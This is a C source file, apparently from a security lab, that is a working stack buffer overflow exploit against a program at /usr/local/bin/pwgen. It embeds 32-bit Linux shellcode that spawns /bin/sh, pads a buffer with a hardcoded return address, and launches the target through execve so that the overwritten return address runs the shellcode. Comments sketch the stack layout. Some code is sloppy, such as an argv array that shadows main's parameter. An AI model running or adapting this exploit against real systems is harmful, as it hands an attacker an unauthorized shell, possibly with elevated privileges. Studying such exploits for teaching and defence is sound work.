//BUFFER OVERFLOW VULNERABILITY 
#include <shadow.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
static char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

#define EXPLOIT_ADDR "\xdd\xdb\xbf\xff" //address of argv[0] 
  //this how the stack looks like if u dont believe me google IA32 linux memory stack
  // argv variables (we store shellcode here)
  // environ variables
  // stack
  // main 
  // print_usage
  // inside print_usage stack
  // argc
  //argv
  //RA (we need to overwrite this, we overwrite this with the system memory argv[0] so we point RA to 
  // above shellcode memory to execute it)
  //ebp buffer end addr (buffer start addr + buffer size = 1024) + 4
  // buffer  start addr 
  //strcpy
  // strncat

int main(int argc, char *argv[])
{
    char buffer[1024]; //in pwgen the buffer has a max space of 1069 becoz 45 characters are in the
    // occupied by the string ""

    static char *argv[] = { NULL, NULL };
    static char *environ[] = { NULL };

    memset(buffer, 0x41, 1024); //copy 1024 bytes of character A into the buffer 
    memcpy(buffer, shellcode, 45); // copy shellcode into buffer 45 times 
    memcpy(buffer+984, EXPLOIT_ADDR, 4); //

    argv[0] = buffer; //set argv[0] to buffer, so RA of print_usage will call shellcode in memory
    execve("/usr/local/bin/pwgen", argv, environ);
    perror("execve");
    return 2;

}
